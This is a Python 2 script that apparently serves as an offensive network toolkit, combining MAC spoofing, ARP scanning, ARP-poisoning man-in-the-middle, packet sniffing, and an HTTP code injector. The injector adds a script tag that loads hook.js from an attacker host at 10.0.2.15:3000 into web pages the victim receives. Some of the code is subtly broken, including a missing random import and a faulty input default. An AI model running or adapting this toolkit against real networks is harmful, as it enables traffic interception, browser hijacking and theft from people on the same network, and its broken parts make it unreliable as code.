#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import subprocess
import argparse
import re
import time
import sys

# ================================= For mac_changer ========================================
def gen_mac_address():
    pefix_mac_address_list = ["00:00:0C:", "00:01:42:", "00:01:43:", "00:01:63:", "00:01:64:", "00:01:96:", "00:01:97:", "00:01:C7:", "00:01:C9:"]
    return (str(random.choice(pefix_mac_address_list)) + "%02x:%02x:%02x") % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255),
    )

def get_current_mac(nic):
    ifconfig_result = subprocess.check_output(["ifconfig", nic])
    mac_address_search_result = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(ifconfig_result))
    if mac_address_search_result:
        return mac_address_search_result.group(0)
    else:
        print("[---] ERROR! Could not read the MAC-address")
        sys.exit()

def change_mac(nic, gen_mac):
    print("Changing MAC-address for " + nic + " to " + gen_mac + "\n...")
    subprocess.call(["ifconfig", nic, "down"])
    subprocess.call(["ifconfig", nic, "hw", "ether", gen_mac])
    subprocess.call(["ifconfig", nic, "up"])

# THE MAIN FUNCTION TO CHANGE THE MAC-ADDRESS
def mac_changer():
    nic = raw_input("Write NIC (example: eth0): ")
    gen_mac = gen_mac_address()
    current_mac = get_current_mac(nic)
    print("Current MAC-address is " + str(current_mac))
    if not current_mac == gen_mac:
        change_mac(nic, gen_mac)
        current_mac = get_current_mac(nic)
        if current_mac == gen_mac:
            print("[+++] SUCCESS! MAC-address changed successfully! Your new MAC-address is " + str(current_mac))
        else:
            print("[---] ERROR! MAC-address didn't change!")
            sys.exit()
    else:
        print("[---] ERROR! New MAC-address is the same as the current MAC-address")
        sys.exit()
# ================================= /For mac_changer ========================================
# ================================= For network_scanner ========================================
def get_cidr():
    result = subprocess.check_output(["ip", "route"])
    cidr = re.search(r"([1-9]|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])(\.(\d|[1-9]\d|1\d{2}|2[0-4]\d|25[0-5])){3}\/\d+", str(result))
    if cidr:
        return cidr.group(0)
    else:
        print("[---] ERROR! Could not read the CIDR")
        sys.exit()

def scan_the_network(ip, only_ip=False):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    clients_list = []
    if only_ip:
        for element in answered_list:
            clients_list.append(element[1].psrc)
    else:
        for element in answered_list:
            clients_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
            clients_list.append(clients_dict)

    return clients_list

def print_host_list(host_list, ip=True, mac=True):
    if ip and mac:
        print("IP\t\tMAC-address\n---------------------------------")
        for host in host_list:
            print(host["ip"] + "\t" + host["mac"])
    else:
        print("IP\n---------------------------------")
        for host in host_list:
            print(host["ip"])

# THE MAIN FUNCTION TO SCAN THE NETWORK <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
def network_scanner(only_ip):
    return scan_the_network(get_cidr(), only_ip)
# ================================= /For network_scanner ========================================
# ================================= For arp_spoofing ========================================
def presettings():
    subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)

def get_gateway_ip():
    result = subprocess.check_output(["ip", "route"])
    gateway_ip = re.search(r"(?<=via ).*(?= dev)", str(result))
    return gateway_ip.group(0)

def get_mac_by_ip(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc

def spoof_arp_tables(victim_ip_list, spoof_ip_list):
    if isinstance(victim_ip_list, list):
        for victim_ip in victim_ip_list:
            victim_mac = get_mac_by_ip(victim_ip)
            packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip_list)
            scapy.send(packet, verbose=False)
    elif isinstance(spoof_ip_list, list):
        victim_mac = get_mac_by_ip(victim_ip_list)
        for spoof_ip in spoof_ip_list:
            packet = scapy.ARP(op=2, pdst=victim_ip_list, hwdst=victim_mac, psrc=spoof_ip)
            scapy.send(packet, verbose=False)
    else:
        victim_mac = get_mac_by_ip(victim_ip_list)
        packet = scapy.ARP(op=2, pdst=victim_ip_list, hwdst=victim_mac, psrc=spoof_ip_list)
        scapy.send(packet, verbose=False)

def restore_arp_tables(dst_ip_list, src_ip_list):
    if isinstance(dst_ip_list, list):
        src_mac = get_mac_by_ip(src_ip_list)
        for dst_ip in dst_ip_list:
            dst_mac = get_mac_by_ip(dst_ip)
            packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip_list, hwsrc=src_mac)
            scapy.send(packet, count=4, verbose=False)
    elif isinstance(src_ip_list, list):
        dst_mac = get_mac_by_ip(dst_ip_list)
        for src_ip in src_ip_list:
            src_mac = get_mac_by_ip(src_ip)
            packet = scapy.ARP(op=2, pdst=dst_ip_list, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
            scapy.send(packet, count=4, verbose=False)
    else:
        dst_mac = get_mac_by_ip(dst_ip_list)
        src_mac = get_mac_by_ip(src_ip_list)
        packet = scapy.ARP(op=2, pdst=dst_ip_list, hwdst=dst_mac, psrc=src_ip_list, hwsrc=src_mac)
        scapy.send(packet, count=4, verbose=False)

# THE MAIN FUNCTION TO SPOOF ARP-TABLES <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
def arp_spoofer():
    spoof_cmd = raw_input("Do you want to get an arp-spoof for all hosts? (y/n or whatever you want to exit): ")
    interval_in_seconds = raw_input("Set prefer interval for arping in seconds (by default: 2): ") | 2
    presettings()
    gateway_ip = get_gateway_ip()
    try:
        if "n" == spoof_cmd:
            print_host_list(network_scanner(False))
            target_ip = raw_input("Choose an 'IP' showed above: ")
            start = time.time()
            while True:
                spoof_arp_tables(target_ip, gateway_ip)
                spoof_arp_tables(gateway_ip, target_ip)
                print("\rTime (in seconds) left: " + str(time.time() - start)),
                sys.stdout.flush()
                time.sleep(interval_in_seconds)

        elif "y" == spoof_cmd:
            target_ip = network_scanner(True)
            start = time.time()
            while True:
                spoof_arp_tables(target_ip, gateway_ip)
                spoof_arp_tables(gateway_ip, target_ip)
                print("\rTime (in seconds) left: " + str(time.time() - start)),
                sys.stdout.flush()
                time.sleep(interval_in_seconds)
        else:
            sys.exit()
    except (KeyboardInterrupt, BaseException), e:
        print("WARNING! Something get wrong!... Resetting ARP-tables... Please wait...")
        restore_arp_tables(target_ip, gateway_ip)
        restore_arp_tables(gateway_ip, target_ip)
        print("ARP-tables were resetting successfully!")
# ================================= /For arp_spoofing ========================================
# ================================= For traffic_sniffer ========================================
def sniffer_callback(packet):
    print(packet.show())  # think, what to present/search

def traffic_sniffer():
    nic = raw_input("What NIC would you prefer to sniff on? (examples: 'eth0', 'wlan0'): ")
    scapy.sniff(iface=nic, store=False, prn=sniffer_callback)
# ================================= /For traffic_sniffer ========================================
# ================================= /For code_injector ========================================
http_ports = [80, 8080, 8008, 8000]

def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-c0", "--chain0", dest="chain_name0", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
    parser.add_argument("-c1", "--chain1", dest="chain_name1", help="Chain name: FORWARD, OUTPUT, INPUT etc.")
    parser.add_argument("-qn", "--queue-num", dest="queue_num", help="Queue number: 0, 1, 3 etc.")
    options = parser.parse_args()
    if not options.chain_name0:
        parser.error("Please, specify a chain name, use --help for more info")
    elif not options.queue_num:
        parser.error("Please, specify a queue number, use --help for more info")
    else:
        if ("OUTPUT" or "INPUT") == options.chain_name0:
            if not options.chain_name1:
                parser.error("Please, specify a chain name, use --help for more info")
    return options

def presets_for_intercept_and_modify_packets(options):
    if options.chain_name1:
        subprocess.call(["iptables", "-I", options.chain_name1, "-j", "NFQUEUE", "--queue-num", options.queue_num])
    subprocess.call(["iptables", "-I", options.chain_name0, "-j", "NFQUEUE", "--queue-num", options.queue_num])

def flush_presets():
    subprocess.call("iptables --flush", shell=True)

def set_load_data(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport in http_ports:
            print("Request")
            # print(scapy_packet.show())
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)

        elif scapy_packet[scapy.TCP].sport in http_ports:
            print("Response")
            # print(scapy_packet.show())
            injection_code = "<script defer src='http://10.0.2.15:3000/hook.js'></script>"
            load = load.replace("</head>", injection_code + "</head>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(injection_code)
                content_length_header = "Content-Length: "
                load = load.replace(content_length_header + content_length, content_length_header + str(new_content_length))

        if load != scapy_packet[scapy.Raw].load:
            new_packet = set_load_data(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()

def code_injector():
    options = get_args()
    presets_for_intercept_and_modify_packets(options)
    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(int(options.queue_num), process_packet)
        queue.run()
    except (KeyboardInterrupt, BaseException), e:
        print("WARNING! Something get wrong!... Flushing IP-tables... Please wait...")
        flush_presets()
        print("IP-tables were flushing successfully!")
# ================================= /For code_injector ========================================

# def get_args():
#     parser = argparse.ArgumentParser()
#     parser.add_argument("-c", dest="mac_changer", help="Flag to change the MAC-address (example: -c 1)")
#     parser.add_argument("-cs", dest="network_scanner", help="Flag to scan the connected network (example: -cs 1)")
#     parser.add_argument("-css", dest="arp_spoofer", help="Flag to spoof the VICTIM and the GATEWAY every 2 sec in infinite loop (example: -css 1)")
#     parser.add_argument("-csss", dest="traffic_sniffer", help="Flag to sniff the VICTIM traffic (example: -csss 1)")
#     command = parser.parse_args()
#     if not command:
#         parser.error("Please, specify one of the following flags --> |-c|-cs|-css|-csss|, use --help for more info")
#         if not (command.mac_changer | command.network_scanner | command.arp_spoofer | command.traffic_sniffer):
#             parser.error("WARNING! Incorrect flag, use --help for more info")
#     return command

def cmd_switch():
    cmd = raw_input(
        "Choose one of:\n>>> 'm' - mac_changer <<<\n>>> 'n' - network_scanner <<<\n>>> 'a' - arp_spoofer <<<\n>>> 't' - traffic_sniffer <<<\n>>> 'c' - code_injector <<<\n>>> 'e' - exit <<<\n>>> Write here: ")
    if "m" == cmd:
        mac_changer()  # independent
    elif "n" == cmd:
        print_host_list(network_scanner(False))  # independent
    elif "a" == cmd:
        arp_spoofer()  # independent # needs to be a demon
    elif "t" == cmd:
        traffic_sniffer()  # independent
    elif "c" == cmd:
        code_injector()  # independent
    elif "e" == cmd:
        sys.exit()
    return cmd

def JUSTDOIT():
    cmd = cmd_switch()
    while cmd not in ["m", "n", "a", "t", "c"]:
        cmd = cmd_switch()

JUSTDOIT()
